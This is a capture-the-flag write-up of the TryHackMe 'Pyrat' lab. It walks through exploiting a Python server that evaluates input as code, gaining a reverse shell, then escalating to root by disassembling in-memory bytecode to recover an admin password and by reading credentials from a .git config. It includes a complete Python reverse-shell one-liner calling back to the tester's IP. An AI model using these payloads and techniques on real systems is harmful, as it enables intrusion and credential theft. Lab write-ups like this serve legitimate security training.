---
tags:
  - thm
  - easy
  - python
  - git
  - code-analysis
Scenario: Custom Python HTTP server allowing code execution; PrivEsc via Git history & memory analysis
Link: https://tryhackme.com/room/pyrat
---
## 💡 Key Learnings & Takeaways

1. **Socket Connection:** If an HTTP server requests a "more basic connection", attempt a raw socket connection using `nc IP PORT`.
    
2. **Git Forensics:** Always check for `.git` directories in non-standard locations (like `/opt`). It often contains credentials or legacy code.
    
3. **Python Memory Inspection:** If you cannot read a `.py` file due to permissions but the script is running, you can reverse engineer it from memory using the `dis` module.
    
---

## 🛠️ Techniques & Commands

### 1. Python RCE / Enumeration (No Shell Binaries)

Use these one-liners when standard Linux binaries (`ls`, `cat`, `id`) are missing or restricted.

```Python
# List files in current directory
import os; print(os.listdir('.'))

# Check current user and UID
import getpass; print(getpass.getuser())
import os; print(os.getuid())

# Read a specific file
print(open('/path/to/file').read())
```

### 2. Git Manual Recon (Local)

If a `.git` folder is found:
```bash
# View commit history
git --git-dir=.git --work-tree=. log

# View content of a specific commit (look for removed passwords/code)
git --git-dir=.git --work-tree=. show <COMMIT_HASH>
```

### 3. Python Bytecode Disassembly (Bypassing Read Permissions)

**Scenario:** Script is running as `root`, but you are `www-data` and cannot read the source file. **Solution:** Disassemble the function loaded in memory to find hardcoded strings.

```Python
# 1. List loaded function names
print(globals())

# 2. Disassemble the target function (e.g., 'secret_check')
import dis
dis.dis(secret_check)

# 3. Look for 'LOAD_CONST' opcodes containing strings/passwords
```

---
# 🏴‍☠️ Pyrat (THM)

**Tags:** #thm #easy #python #git #code-analysis #protip
**IP:** 10.81.149.164
**Scenario:** Custom Python HTTP server allowing code execution; PrivEsc via Git history & memory analysis.
**Link:** [https://tryhackme.com/room/pyrat](https://tryhackme.com/room/pyrat)

## 💡 Key Learnings & Takeaways
1.  **Socket Connection:** If an HTTP server requests a "more basic connection", attempt a raw socket connection using `nc IP PORT`.
2.  **Git Forensics:** Always check for `.git` directories in non-standard locations (like `/opt`). It often contains credentials or legacy code.
3.  **Python Memory Inspection:** If you cannot read a `.py` file due to permissions but the script is running, you can reverse engineer it from memory using the `dis` module.

---

## 🛠️ Techniques & Commands 

### 1. Python RCE / Enumeration (No Shell Binaries)
Use these one-liners when standard Linux binaries (`ls`, `cat`, `id`) are missing or restricted.

```python
# List files in current directory
import os; print(os.listdir('.'))

# Check current user and UID
import getpass; print(getpass.getuser())
import os; print(os.getuid())

# Read a specific file
print(open('/path/to/file').read())
```

### 2. Git Manual Recon (Local)
If a `.git` folder is found:
```bash
# View commit history
git --git-dir=.git --work-tree=. log

# View content of a specific commit (look for removed passwords/code)
git --git-dir=.git --work-tree=. show <COMMIT_HASH>
```

### 3. 🔥 Python Bytecode Disassembly (Bypassing Read Permissions)
**Scenario:** Script is running as `root`, but you are `www-data` and cannot read the source file.
**Solution:** Disassemble the function loaded in memory to find hardcoded strings.

```python
# 1. List loaded function names
print(globals())

# 2. Disassemble the target function (e.g., 'secret_check')
import dis
dis.dis(secret_check)

# 3. Look for 'LOAD_CONST' opcodes containing strings/passwords
```

---

## 📝 Walkthrough Notes (Context)

### 1. Recon & Foothold
* **Discovery:** Port 8000 was open. `curl` failed, but `nc 10.81.149.164 8000` established a connection.
* **RCE:** The server evaluated input as Python code.
* **Reverse Shell:** Standard bash reverse shells failed. Used a Python one-liner to connect back to the listener.

### 2. Enumeration & PrivEsc
* **Discovery:** Found `/opt/dev/.git`.
* **Git Analysis:** `git log` revealed a commit "Added shell endpoint". `git show` displayed code checking for a specific string (`'some_endpoint'`), but the live server rejected it.
* **Code Mismatch:** The code running in memory was different from the git history.
* **Exploitation:** Used `dis.dis()` to inspect the `get_admin` function in memory.
    * Found the actual password inside a `LOAD_CONST` instruction.
    * Used the password to authenticate as `admin` and drop into a root shell.

### 3. User Flag
* **Config:** Checked `/opt/dev/.git/config`.
* **Credentials:** Found credentials for user `think` (didn't need those - had root)
* **Action:** Switched user (`su think`) to read `user.txt`.

---

Starting with a scan:
`nmap -A -T4 10.81.149.164`
```bash
Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for 10.81.149.164
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:9a:4f:b1:18:4d:3b:8c:79:c1:c6:e7:c1:a0:80:d0 (RSA)
|   256 a9:d7:b7:f0:91:5f:dc:b2:09:fe:cb:3e:4e:35:70:a8 (ECDSA)
|_  256 dc:66:70:39:32:26:f7:7b:8b:bb:54:63:97:14:41:64 (ED25519)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

`curl 10.81.149.164:8000`
```bash
Try a more basic connection    
```

Since the server explicitly asked for a "more basic connection" and rejected the HTTP request, we can assume it wants a raw socket connection without standard HTTP headers. We can use `netcat` to establish a direct TCP connection.
```bash
nc 10.81.149.164 8000
```

Attempting to enumerate the file system using standard shell commands yielded no output:
```python
import os; print(os.popen('ls -la').read())
# No output
```

To diagnose the environment, we utilized Python's internal `os` module functions instead of relying on external system binaries:
```python
import os; print(os.getcwd())
/root

import os; print(os.listdir())
[Errno 13] Permission denied
```

The `[Errno 13] Permission denied` error is significant. It confirms two key facts:

1. **Code Execution Verified:** The Python interpreter is successfully executing our injected logic.
2. **Privilege Mismatch:** Although the current working directory is `/root` (the superuser's home directory), the process lacks read permissions. This indicates we are running as a lower-privileged user.

Investigating the user identity reveals a discrepancy:
```python
import getpass; print(getpass.getuser())
root

import os; print(os.getuid())
33
```

While the username is reported as `root` (likely due to an environment variable), the numeric User ID (UID) is `33`, which typically corresponds to the `www-data` service account.

To facilitate further enumeration and escape this restricted environment, the next step is to establish a stable reverse shell.

Since standard Linux commands like `ls` were failing, there's a good chance `netcat` or `bash` might be missing or restricted on the target. However, **Python** works perfectly.

Before crafting the Python payload to send to the server, I need to set up the "receiver" on my end. 
Find out which IP address the server should connect back to - TryHackMe VPN IP which is assigned with Tunnel:

`ifconfig | awk '/^[a-z]/ {intf=$1} /inet / && !/127.0.0.1/ {print intf, $2}'`
```bash mac
en0: xxx
utun9: 192.168.194.178
```

Opening a local listener on port 2323:
`nc -lvn 2323`

Running code on target:
`nc 10.81.149.164 8000`
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.194.178",2323));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Gives us a shell on the listener, using `id` we can retrieve the user name **www-data**
```bash
nc -lvn 2323
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Using `ls -la` in the `/root` is denied, let's try `$ ls -la /`
```bash
$ ls -la /
total 2035784
drwxr-xr-x  18 root root       4096 Dec 11 14:15 .
drwxr-xr-x  18 root root       4096 Dec 11 14:15 ..
lrwxrwxrwx   1 root root          7 Feb 23  2022 bin -> usr/bin
drwxr-xr-x   4 root root       4096 Apr 27  2025 boot
drwxr-xr-x  17 root root       4000 Dec 11 14:15 dev
drwxr-xr-x 106 root root       4096 Dec 11 14:15 etc
drwxr-xr-x   4 root root       4096 Dec 11 14:15 home
lrwxrwxrwx   1 root root          7 Feb 23  2022 lib -> usr/lib
lrwxrwxrwx   1 root root          9 Feb 23  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root          9 Feb 23  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root         10 Feb 23  2022 libx32 -> usr/libx32
drwx------   2 root root      16384 Jun  2  2023 lost+found
drwxr-xr-x   2 root root       4096 Jun  2  2023 media
drwxr-xr-x   2 root root       4096 Feb 23  2022 mnt
drwxr-xr-x   3 root root       4096 Jun 21  2023 opt
dr-xr-xr-x 172 root root          0 Dec 11 14:14 proc
drwxrwx---   7 root root       4096 Apr 15  2024 root
drwxr-xr-x  26 root root        800 Dec 11 14:32 run
lrwxrwxrwx   1 root root          8 Feb 23  2022 sbin -> usr/sbin
drwxr-xr-x   2 root root       4096 Feb 23  2022 srv
-rw-------   1 root root 2084569088 Jun  2  2023 swap.img
dr-xr-xr-x  13 root root          0 Dec 11 14:14 sys
drwxrwxrwt  12 root root       4096 Dec 11 14:32 tmp
drwxr-xr-x  14 root root       4096 Feb 23  2022 usr
drwxr-xr-x  12 root root       4096 Dec 22  2023 var
```

That file listing looks surprisingly clean—it’s a very standard Linux root filesystem. Nothing screams "secret hacker folder" right here in the open.

However, the hint mentions **"delving into the directories"** to find that "well-known folder." Since we are looking for a custom application (Pyrat), we should look in the places where admins usually install third-party or **opt**ional software.

`ls -la /opt/dev`
```bash
drwxrwxr-x 3 think think 4096 Jun 21  2023 . 
drwxr-xr-x 3 root  root  4096 Jun 21  2023 .. 
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
```

Inside `/opt/dev` we find a `.git` folder, owned by user named `think`

Check the git log using Git Flags gives us a curious commit ID
`git --git-dir=/opt/dev/.git --work-tree=/opt/dev log`
```bash
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
```

Check the commit content:
`git --git-dir=/opt/dev/.git --work-tree=/opt/dev show 0a3c36d66369fd4b07ddca72e5379461a63470bf`
```python
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
```

The code checks if the user sends the specific string `'some_endpoint'`.
**The Action:** If they do, it runs `get_this_enpoint()`

Running this command _inside reverse shell_ to connect to the server itself (localhost),  type the secret string `some_endpoint` and hit Enter:

```bash
$ nc localhost 8000
nc localhost 8000
"some_endpoint"
"some_endpoint"
```

**The Check Failed:** The server received our input, checked if it matched the secret password, and said "Nope!". Because it didn't match, it fell into the `else:` block, which tries to run input as Python code.

**Why did the check fail?** The code checks: `if data == 'some_endpoint':`. When we type into `nc` and hit Enter, we are actually sending `'some_endpoint\n'` (the text plus a **newline** character). Because `'some_endpoint\n'` is NOT the same as `'some_endpoint'`, the password check fails.

We need to send the text _without_ hitting Enter.

Let's try using `echo -n` (which sends text with no newline) piped into netcat

`echo -n "some_endpoint" | nc localhost 8000`
```bash
nc -lvn 2323
$ echo -n "some_endpoint" | nc localhost 8000
echo -n "some_endpoint" | nc localhost 8000
name 'some_endpoint' is not defined
```

It implies that the actual endpoint name in the **running** code is different from what we saw in the git history. Since we have Python code execution on the server, we don't need to guess. We can ask the running program to **show us its own source code** using the `inspect` or `dis` modules.

First, list all loaded variables to find the function name:

`print(globals())`
```python
{'...': ..., 'switch_case': <function switch_case at 0x7f6ece5c0e50>, ...}
```

The function is named `switch_case`. Trying to read the source code with `inspect.getsource(switch_case)` fails because we are `www-data` and the file is in `/root`.

**The Bypass:** usage of `dis` module (disassembler) allows us to look at the "bytecode" stored in memory, bypassing file permissions.

`import dis; dis.dis(switch_case)`
```bytecode
 35           0 LOAD_FAST                1 (data)
              2 LOAD_CONST               1 ('admin')
              4 COMPARE_OP               2 (==)
```

The `LOAD_CONST 1 ('admin')` instruction reveals the new string is `admin`.

When input is `admin`, the code calls `get_admin`. We disassemble that function to find the password:

`import dis; dis.dis(get_admin)`
```bytecode
 30           LOAD_CONST               3 ('[redacted]')
 32           STORE_FAST               2 (password)
```

We found the password.
Now we have the full authentication chain. Connecting to the server again:

```bash
$ nc localhost 8000
admin
Password:
[redacted]
Welcome Admin!!! Type "shell" to begin
shell
# id
uid=0(root) gid=0(root) groups=0(root)
```

We are now **root**! We can grab the root flag immediately.
`cat /root/root.txt`
### Finding the User Flag
We still need the user flag. Earlier, inside `/opt/dev/.git`, we can look at the configuration to find valid system users.

`cat /opt/dev/.git/config`
```bash
[credential "https://github.com"]
    username = think
    password = [redacted]
```

This reveals the user `think`. Since we are already root, we can simply navigate to their home folder or switch users to grab the flag.

```bash
su think
cat /home/think/user.txt
```

**Flags Captured!**
